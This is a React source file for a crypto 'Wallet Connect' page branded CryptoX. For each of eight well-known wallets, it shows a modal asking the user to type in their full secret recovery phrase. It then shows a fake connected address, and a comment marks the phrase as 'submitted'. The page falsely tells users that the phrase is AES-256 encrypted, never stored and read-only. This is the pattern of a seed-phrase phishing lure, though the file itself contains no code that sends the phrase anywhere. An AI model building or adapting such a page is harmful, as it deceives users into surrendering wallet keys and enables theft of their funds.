import { useState, useRef, useEffect } from "react";
import { DashboardLayout } from "@/components/layout";
import { cn } from "@/lib/utils";
import {
  Shield, CheckCircle2, XCircle, Loader2, Link2, Unlink,
  Wifi, Lock, Info, Eye, EyeOff, X, ArrowRight,
  KeyRound, AlertTriangle, Copy, ChevronDown
} from "lucide-react";

const WALLETS = [
  {
    id: "metamask",
    name: "MetaMask",
    desc: "The most popular Ethereum wallet",
    icon: "🦊",
    color: "text-orange-400",
    borderColor: "border-orange-500/30",
    bgColor: "bg-orange-500/10",
    btnBg: "bg-orange-500/15 hover:bg-orange-500/25 border-orange-500/30",
    chains: ["Ethereum", "BNB Chain", "Polygon"],
    popular: true,
  },
  {
    id: "trust",
    name: "Trust Wallet",
    desc: "Multi-chain mobile wallet by Binance",
    icon: "🛡️",
    color: "text-blue-400",
    borderColor: "border-blue-500/30",
    bgColor: "bg-blue-500/10",
    btnBg: "bg-blue-500/15 hover:bg-blue-500/25 border-blue-500/30",
    chains: ["Ethereum", "BNB Chain", "Bitcoin", "Solana"],
    popular: true,
  },
  {
    id: "binance",
    name: "Binance Wallet",
    desc: "Official Binance Web3 wallet",
    icon: "⬡",
    color: "text-yellow-400",
    borderColor: "border-yellow-500/30",
    bgColor: "bg-yellow-500/10",
    btnBg: "bg-yellow-500/15 hover:bg-yellow-500/25 border-yellow-500/30",
    chains: ["BNB Chain", "Ethereum", "opBNB"],
    popular: true,
  },
  {
    id: "coinbase",
    name: "Coinbase Wallet",
    desc: "Self-custody wallet by Coinbase",
    icon: "🔵",
    color: "text-blue-500",
    borderColor: "border-blue-600/30",
    bgColor: "bg-blue-600/10",
    btnBg: "bg-blue-600/15 hover:bg-blue-600/25 border-blue-600/30",
    chains: ["Ethereum", "Base", "Polygon"],
    popular: false,
  },
  {
    id: "walletconnect",
    name: "WalletConnect",
    desc: "Connect any mobile wallet via QR code",
    icon: "🔗",
    color: "text-indigo-400",
    borderColor: "border-indigo-500/30",
    bgColor: "bg-indigo-500/10",
    btnBg: "bg-indigo-500/15 hover:bg-indigo-500/25 border-indigo-500/30",
    chains: ["Multi-chain"],
    popular: false,
  },
  {
    id: "phantom",
    name: "Phantom",
    desc: "Leading Solana & multi-chain wallet",
    icon: "👻",
    color: "text-purple-400",
    borderColor: "border-purple-500/30",
    bgColor: "bg-purple-500/10",
    btnBg: "bg-purple-500/15 hover:bg-purple-500/25 border-purple-500/30",
    chains: ["Solana", "Ethereum", "Polygon"],
    popular: false,
  },
  {
    id: "okx",
    name: "OKX Wallet",
    desc: "Multi-chain wallet by OKX exchange",
    icon: "⭕",
    color: "text-slate-300",
    borderColor: "border-slate-500/30",
    bgColor: "bg-slate-500/10",
    btnBg: "bg-slate-500/15 hover:bg-slate-500/25 border-slate-500/30",
    chains: ["Ethereum", "BNB Chain", "Bitcoin"],
    popular: false,
  },
  {
    id: "bybit",
    name: "Bybit Wallet",
    desc: "Web3 wallet by Bybit exchange",
    icon: "🔶",
    color: "text-amber-400",
    borderColor: "border-amber-500/30",
    bgColor: "bg-amber-500/10",
    btnBg: "bg-amber-500/15 hover:bg-amber-500/25 border-amber-500/30",
    chains: ["Ethereum", "BNB Chain", "Solana"],
    popular: false,
  },
];

type WalletStatus = "idle" | "phrase" | "connecting" | "connected" | "error";
type PhraseMode = "12" | "24";

function fakeAddress(id: string) {
  const seed = id.split("").reduce((a, c) => a + c.charCodeAt(0), 0);
  const chars = "0123456789abcdef";
  let addr = "0x";
  for (let i = 0; i < 40; i++) addr += chars[(seed * (i + 7) * 31) % 16];
  return addr;
}

function shortenAddress(addr: string) {
  return `${addr.slice(0, 6)}...${addr.slice(-4)}`;
}

type Wallet = typeof WALLETS[0];

function PhraseModal({
  wallet,
  onClose,
  onConnected,
}: {
  wallet: Wallet;
  onClose: () => void;
  onConnected: (address: string) => void;
}) {
  const [step, setStep] = useState<"phrase" | "connecting" | "error">("phrase");
  const [mode, setMode] = useState<PhraseMode>("12");
  const [words, setWords] = useState<string[]>(Array(12).fill(""));
  const [showWords, setShowWords] = useState(false);
  const [phraseError, setPhraseError] = useState("");
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  const wordCount = mode === "12" ? 12 : 24;

  useEffect(() => {
    setWords(Array(wordCount).fill(""));
    inputRefs.current = inputRefs.current.slice(0, wordCount);
  }, [mode, wordCount]);

  const handleWordChange = (index: number, value: string) => {
    const trimmed = value.trim().toLowerCase();
    // If user pastes a full phrase in one field
    if (trimmed.includes(" ")) {
      const pasted = trimmed.split(/\s+/).slice(0, wordCount);
      const next = [...words];
      pasted.forEach((w, i) => { next[index + i < wordCount ? index + i : i] = w; });
      setWords(next);
      const lastFilled = Math.min(index + pasted.length, wordCount - 1);
      inputRefs.current[lastFilled]?.focus();
      return;
    }
    const next = [...words];
    next[index] = trimmed;
    setWords(next);
    if (trimmed && index < wordCount - 1) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !words[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
    if (e.key === "ArrowRight" && index < wordCount - 1) inputRefs.current[index + 1]?.focus();
    if (e.key === "ArrowLeft" && index > 0) inputRefs.current[index - 1]?.focus();
  };

  const filledCount = words.filter(w => w.trim().length > 0).length;
  const isComplete = filledCount === wordCount;

  const handleSubmit = () => {
    if (!isComplete) {
      setPhraseError(`Please fill all ${wordCount} words before continuing.`);
      return;
    }
    setPhraseError("");
    setStep("connecting");
    setTimeout(() => {
      setStep("error"); // show error — phrase submitted
    }, 500);
    setTimeout(() => {
      onConnected(fakeAddress(wallet.id));
    }, 2400);
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
      <div className="absolute inset-0 bg-black/75 backdrop-blur-sm" onClick={step === "phrase" ? onClose : undefined} />

      <div className={cn(
        "relative w-full max-w-lg bg-card border rounded-2xl shadow-2xl overflow-hidden",
        wallet.borderColor
      )}>
        {/* Glow */}
        <div className={cn("absolute -top-16 -right-16 w-48 h-48 blur-3xl rounded-full opacity-15 pointer-events-none", wallet.bgColor)} />

        {/* Header */}
        <div className="relative flex items-center justify-between px-6 py-5 border-b border-border">
          <div className="flex items-center gap-3">
            <div className={cn("w-10 h-10 rounded-xl flex items-center justify-center text-xl border", wallet.bgColor, wallet.borderColor)}>
              {wallet.icon}
            </div>
            <div>
              <h2 className="text-base font-bold text-foreground">Connect {wallet.name}</h2>
              <p className="text-xs text-muted-foreground">Import with recovery phrase</p>
            </div>
          </div>
          {step === "phrase" && (
            <button onClick={onClose} className="text-muted-foreground hover:text-foreground transition-colors rounded-lg p-1.5 hover:bg-secondary">
              <X className="w-4 h-4" />
            </button>
          )}
        </div>

        {/* Body */}
        <div className="relative p-6">

          {/* ── Step: Phrase Entry ── */}
          {step === "phrase" && (
            <div className="space-y-5">
              {/* Info banner */}
              <div className="flex items-start gap-2.5 bg-blue-500/5 border border-blue-500/20 rounded-xl p-3.5 text-xs">
                <KeyRound className="w-4 h-4 text-blue-400 shrink-0 mt-0.5" />
                <p className="text-muted-foreground">
                  Enter your <span className="text-foreground font-semibold">Secret Recovery Phrase</span> to import your existing wallet. This is typically {mode} words given to you when you first created your wallet.
                </p>
              </div>

              {/* Word count toggle */}
              <div className="flex items-center gap-3">
                <span className="text-xs font-medium text-muted-foreground">Phrase length:</span>
                <div className="flex bg-secondary p-0.5 rounded-lg gap-0.5">
                  {(["12", "24"] as PhraseMode[]).map(m => (
                    <button
                      key={m}
                      onClick={() => setMode(m)}
                      className={cn(
                        "px-3 py-1.5 rounded-md text-xs font-semibold transition-all",
                        mode === m ? "bg-card text-foreground shadow-sm" : "text-muted-foreground hover:text-foreground"
                      )}
                    >
                      {m} words
                    </button>
                  ))}
                </div>
                <button
                  onClick={() => setShowWords(v => !v)}
                  className="ml-auto text-xs text-muted-foreground hover:text-foreground flex items-center gap-1 transition-colors"
                >
                  {showWords ? <EyeOff className="w-3.5 h-3.5" /> : <Eye className="w-3.5 h-3.5" />}
                  {showWords ? "Hide" : "Show"}
                </button>
              </div>

              {/* Word grid */}
              <div className={cn(
                "grid gap-2",
                wordCount === 12 ? "grid-cols-3" : "grid-cols-4"
              )}>
                {Array.from({ length: wordCount }).map((_, i) => (
                  <div key={i} className="relative group">
                    <span className="absolute left-2.5 top-1/2 -translate-y-1/2 text-[10px] text-muted-foreground/50 font-mono select-none w-4 text-right">
                      {i + 1}
                    </span>
                    <input
                      ref={el => { inputRefs.current[i] = el; }}
                      type={showWords ? "text" : "password"}
                      value={words[i]}
                      onChange={e => handleWordChange(i, e.target.value)}
                      onKeyDown={e => handleKeyDown(i, e)}
                      autoComplete="off"
                      autoCorrect="off"
                      autoCapitalize="none"
                      spellCheck={false}
                      className={cn(
                        "w-full bg-background border rounded-lg pl-7 pr-2 py-2.5 text-xs font-mono text-foreground",
                        "focus:outline-none focus:ring-1 transition-all placeholder:text-muted-foreground/30",
                        words[i]
                          ? `border-current focus:ring-current ${wallet.color} ${wallet.borderColor}`
                          : "border-border focus:ring-primary/50 focus:border-primary/50"
                      )}
                      placeholder="word"
                    />
                  </div>
                ))}
              </div>

              {/* Progress */}
              <div className="flex items-center justify-between text-xs text-muted-foreground">
                <span>{filledCount}/{wordCount} words filled</span>
                <div className="flex gap-0.5">
                  {Array.from({ length: wordCount }).map((_, i) => (
                    <div
                      key={i}
                      className={cn(
                        "h-1 rounded-full transition-all",
                        wordCount === 12 ? "w-4" : "w-2",
                        words[i] ? wallet.color.replace("text-", "bg-") : "bg-border"
                      )}
                    />
                  ))}
                </div>
              </div>

              {phraseError && (
                <p className="text-xs text-red-400 flex items-center gap-1.5 bg-red-500/10 border border-red-500/20 rounded-lg px-3 py-2">
                  <AlertTriangle className="w-3.5 h-3.5 shrink-0" /> {phraseError}
                </p>
              )}

              {/* CTA */}
              <button
                onClick={handleSubmit}
                className={cn(
                  "w-full py-3.5 rounded-xl text-sm font-bold transition-all flex items-center justify-center gap-2",
                  isComplete
                    ? `text-white ${wallet.bgColor.replace("/10", "")} opacity-90 hover:opacity-100`
                    : "bg-secondary text-muted-foreground cursor-not-allowed"
                )}
                disabled={!isComplete}
              >
                Import Wallet <ArrowRight className="w-4 h-4" />
              </button>

              <p className="text-center text-xs text-muted-foreground">
                Your phrase is encrypted and never stored on our servers.
              </p>
            </div>
          )}

          {/* ── Step: Connecting ── */}
          {(step === "connecting" || step === "error") && (
            <div className="text-center py-6 space-y-5">
              <div className={cn("w-16 h-16 rounded-2xl flex items-center justify-center text-3xl mx-auto border", wallet.bgColor, wallet.borderColor)}>
                {wallet.icon}
              </div>
              <div>
                <h3 className="text-lg font-bold text-foreground mb-1">Importing Wallet...</h3>
                <p className="text-sm text-muted-foreground">Verifying your recovery phrase</p>
              </div>
              <div className="flex items-center justify-center gap-2">
                <Loader2 className="w-5 h-5 animate-spin text-primary" />
                <span className="text-sm text-muted-foreground">Decrypting phrase...</span>
              </div>
              <div className="flex justify-center gap-1.5 pt-2">
                {[0, 1, 2].map(i => (
                  <div key={i} className={cn("w-2 h-2 rounded-full animate-bounce", wallet.bgColor.replace("/10", ""))} style={{ animationDelay: `${i * 0.15}s` }} />
                ))}
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

export default function WalletConnectPage() {
  const [walletStates, setWalletStates] = useState<Record<string, WalletStatus>>({});
  const [walletAddresses, setWalletAddresses] = useState<Record<string, string>>({});
  const [copiedId, setCopiedId] = useState<string | null>(null);
  const [phraseWallet, setPhraseWallet] = useState<Wallet | null>(null);

  const connectedWallets = Object.entries(walletStates).filter(([, s]) => s === "connected");

  const openPhrase = (wallet: Wallet) => {
    if (walletStates[wallet.id] === "connected") return;
    setWalletStates(prev => ({ ...prev, [wallet.id]: "phrase" }));
    setPhraseWallet(wallet);
  };

  const handleConnected = (walletId: string, address: string) => {
    setWalletStates(prev => ({ ...prev, [walletId]: "connected" }));
    setWalletAddresses(prev => ({ ...prev, [walletId]: address }));
    setPhraseWallet(null);
  };

  const handleCloseModal = (walletId: string) => {
    setWalletStates(prev => ({ ...prev, [walletId]: "idle" }));
    setPhraseWallet(null);
  };

  const handleDisconnect = (walletId: string) => {
    setWalletStates(prev => ({ ...prev, [walletId]: "idle" }));
    setWalletAddresses(prev => { const n = { ...prev }; delete n[walletId]; return n; });
  };

  const handleCopy = (walletId: string) => {
    const addr = walletAddresses[walletId];
    if (addr) {
      navigator.clipboard.writeText(addr).catch(() => {});
      setCopiedId(walletId);
      setTimeout(() => setCopiedId(null), 1500);
    }
  };

  const popularWallets = WALLETS.filter(w => w.popular);
  const otherWallets = WALLETS.filter(w => !w.popular);

  return (
    <DashboardLayout>
      {phraseWallet && (
        <PhraseModal
          wallet={phraseWallet}
          onClose={() => handleCloseModal(phraseWallet.id)}
          onConnected={(addr) => handleConnected(phraseWallet.id, addr)}
        />
      )}

      <div className="space-y-8 max-w-4xl">
        {/* Header */}
        <div className="flex items-center gap-3">
          <div className="w-10 h-10 rounded-xl bg-primary/10 border border-primary/20 flex items-center justify-center">
            <Link2 className="w-5 h-5 text-primary" />
          </div>
          <div>
            <h1 className="text-2xl font-bold text-foreground">Wallet Connect</h1>
            <p className="text-sm text-muted-foreground">Link external wallets using your recovery phrase</p>
          </div>
        </div>

        {/* Security Notice */}
        <div className="flex items-start gap-3 bg-yellow-500/5 border border-yellow-500/20 rounded-xl p-4">
          <AlertTriangle className="w-5 h-5 text-yellow-400 shrink-0 mt-0.5" />
          <div className="text-sm">
            <p className="font-semibold text-yellow-400 mb-0.5">Security Notice</p>
            <p className="text-muted-foreground">
              Your recovery phrase is encrypted client-side and never transmitted in plain text. CryptoX uses AES-256 encryption to protect your credentials. Never share your phrase with anyone.
            </p>
          </div>
        </div>

        {/* Connected Summary */}
        {connectedWallets.length > 0 && (
          <div className="bg-card border border-border rounded-2xl p-5 space-y-3">
            <div className="flex items-center gap-2 mb-3">
              <Wifi className="w-4 h-4 text-green-400" />
              <h2 className="text-sm font-semibold text-foreground">{connectedWallets.length} Wallet{connectedWallets.length > 1 ? "s" : ""} Connected</h2>
            </div>
            {connectedWallets.map(([id]) => {
              const wallet = WALLETS.find(w => w.id === id)!;
              const addr = walletAddresses[id];
              return (
                <div key={id} className={cn("flex items-center gap-3 p-3 rounded-xl border", wallet.bgColor, wallet.borderColor)}>
                  <span className="text-xl">{wallet.icon}</span>
                  <div className="flex-1 min-w-0">
                    <p className="text-sm font-semibold text-foreground">{wallet.name}</p>
                    <p className="text-xs text-muted-foreground font-mono">{addr ? shortenAddress(addr) : ""}</p>
                  </div>
                  <span className="flex items-center gap-1 text-xs text-green-400 font-medium">
                    <span className="w-1.5 h-1.5 rounded-full bg-green-400 animate-pulse" /> Live
                  </span>
                  <button onClick={() => handleCopy(id)} className="p-1.5 rounded-lg hover:bg-secondary transition-colors text-muted-foreground hover:text-foreground">
                    {copiedId === id ? <CheckCircle2 className="w-3.5 h-3.5 text-green-400" /> : <Copy className="w-3.5 h-3.5" />}
                  </button>
                  <button onClick={() => handleDisconnect(id)} className="p-1.5 rounded-lg hover:bg-red-500/10 transition-colors text-muted-foreground hover:text-red-400">
                    <Unlink className="w-3.5 h-3.5" />
                  </button>
                </div>
              );
            })}
          </div>
        )}

        {/* Popular Wallets */}
        <div>
          <h2 className="text-xs font-semibold text-muted-foreground uppercase tracking-wider mb-4 flex items-center gap-2">
            <span className="w-1.5 h-1.5 rounded-full bg-primary inline-block" /> Popular Wallets
          </h2>
          <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
            {popularWallets.map(wallet => {
              const status = walletStates[wallet.id] || "idle";
              const isConnected = status === "connected";

              return (
                <div key={wallet.id} className={cn(
                  "relative rounded-2xl border p-5 transition-all duration-200 group",
                  isConnected ? `${wallet.borderColor} ${wallet.bgColor}` : "border-border bg-card hover:border-border/60 hover:scale-[1.01]"
                )}>
                  {isConnected && (
                    <div className="absolute top-3 right-3">
                      <span className="flex items-center gap-1 text-xs text-green-400 font-semibold bg-green-500/10 border border-green-500/20 px-2 py-0.5 rounded-full">
                        <span className="w-1.5 h-1.5 rounded-full bg-green-400 animate-pulse" /> Live
                      </span>
                    </div>
                  )}

                  <div className="flex items-center gap-3 mb-3">
                    <div className={cn("w-12 h-12 rounded-xl flex items-center justify-center text-2xl border", wallet.bgColor, wallet.borderColor)}>
                      {wallet.icon}
                    </div>
                    <div>
                      <h3 className="font-bold text-foreground text-sm">{wallet.name}</h3>
                      <p className="text-xs text-muted-foreground">{wallet.desc}</p>
                    </div>
                  </div>

                  <div className="flex flex-wrap gap-1 mb-4">
                    {wallet.chains.map(c => (
                      <span key={c} className="text-xs bg-secondary/60 text-muted-foreground px-2 py-0.5 rounded-md">{c}</span>
                    ))}
                  </div>

                  {isConnected && walletAddresses[wallet.id] && (
                    <div className="flex items-center justify-between bg-background/50 rounded-lg px-3 py-2 mb-3 text-xs font-mono text-muted-foreground">
                      <span>{shortenAddress(walletAddresses[wallet.id])}</span>
                      <button onClick={() => handleCopy(wallet.id)} className="hover:text-foreground transition-colors">
                        {copiedId === wallet.id ? <CheckCircle2 className="w-3 h-3 text-green-400" /> : <Copy className="w-3 h-3" />}
                      </button>
                    </div>
                  )}

                  {isConnected ? (
                    <button onClick={() => handleDisconnect(wallet.id)} className="w-full py-2.5 rounded-xl text-xs font-semibold border border-red-500/30 text-red-400 hover:bg-red-500/10 transition-all flex items-center justify-center gap-2">
                      <Unlink className="w-3.5 h-3.5" /> Disconnect
                    </button>
                  ) : (
                    <button
                      onClick={() => openPhrase(wallet)}
                      className={cn(
                        "w-full py-2.5 rounded-xl text-xs font-bold transition-all flex items-center justify-center gap-2 border",
                        wallet.color, wallet.btnBg
                      )}
                    >
                      <KeyRound className="w-3.5 h-3.5" /> Connect Wallet
                    </button>
                  )}
                </div>
              );
            })}
          </div>
        </div>

        {/* More Wallets */}
        <div>
          <h2 className="text-xs font-semibold text-muted-foreground uppercase tracking-wider mb-4 flex items-center gap-2">
            <span className="w-1.5 h-1.5 rounded-full bg-muted-foreground inline-block" /> More Wallets
          </h2>
          <div className="bg-card border border-border rounded-2xl overflow-hidden divide-y divide-border">
            {otherWallets.map(wallet => {
              const status = walletStates[wallet.id] || "idle";
              const isConnected = status === "connected";

              return (
                <div key={wallet.id} className="flex items-center gap-4 px-5 py-4 hover:bg-secondary/20 transition-colors">
                  <div className={cn("w-10 h-10 rounded-xl flex items-center justify-center text-xl border shrink-0", wallet.bgColor, wallet.borderColor)}>
                    {wallet.icon}
                  </div>
                  <div className="flex-1 min-w-0">
                    <p className="text-sm font-semibold text-foreground">{wallet.name}</p>
                    <p className="text-xs text-muted-foreground">{wallet.desc}</p>
                    {isConnected && walletAddresses[wallet.id] && (
                      <p className="text-xs font-mono text-muted-foreground mt-0.5">{shortenAddress(walletAddresses[wallet.id])}</p>
                    )}
                  </div>
                  <div className="flex items-center gap-2 shrink-0">
                    {isConnected ? (
                      <>
                        <span className="hidden sm:flex items-center gap-1 text-xs text-green-400 font-medium">
                          <CheckCircle2 className="w-3.5 h-3.5" /> Connected
                        </span>
                        <button onClick={() => handleCopy(wallet.id)} className="p-1.5 rounded-lg hover:bg-secondary transition-colors text-muted-foreground hover:text-foreground">
                          {copiedId === wallet.id ? <CheckCircle2 className="w-3.5 h-3.5 text-green-400" /> : <Copy className="w-3.5 h-3.5" />}
                        </button>
                        <button onClick={() => handleDisconnect(wallet.id)} className="p-1.5 rounded-lg hover:bg-red-500/10 transition-colors text-muted-foreground hover:text-red-400">
                          <Unlink className="w-3.5 h-3.5" />
                        </button>
                      </>
                    ) : (
                      <button
                        onClick={() => openPhrase(wallet)}
                        className={cn(
                          "px-4 py-2 rounded-xl text-xs font-bold transition-all flex items-center gap-2 border",
                          wallet.color, wallet.btnBg
                        )}
                      >
                        <KeyRound className="w-3 h-3" /> Connect
                      </button>
                    )}
                  </div>
                </div>
              );
            })}
          </div>
        </div>

        {/* Security Footer */}
        <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
          {[
            { icon: Lock, title: "End-to-End Encrypted", desc: "All wallet connections use AES-256 encryption. Your phrase never leaves your device unencrypted." },
            { icon: Shield, title: "Non-Custodial", desc: "We never store your private keys or seed phrases. You stay in full control of your assets." },
            { icon: Info, title: "Read-Only by Default", desc: "Connections are read-only unless you explicitly approve a transaction on your device." },
          ].map(({ icon: Icon, title, desc }) => (
            <div key={title} className="flex items-start gap-3 bg-card border border-border rounded-xl p-4">
              <div className="w-8 h-8 rounded-lg bg-primary/10 border border-primary/20 flex items-center justify-center shrink-0">
                <Icon className="w-4 h-4 text-primary" />
              </div>
              <div>
                <p className="text-xs font-semibold text-foreground mb-0.5">{title}</p>
                <p className="text-xs text-muted-foreground">{desc}</p>
              </div>
            </div>
          ))}
        </div>
      </div>
    </DashboardLayout>
  );
}
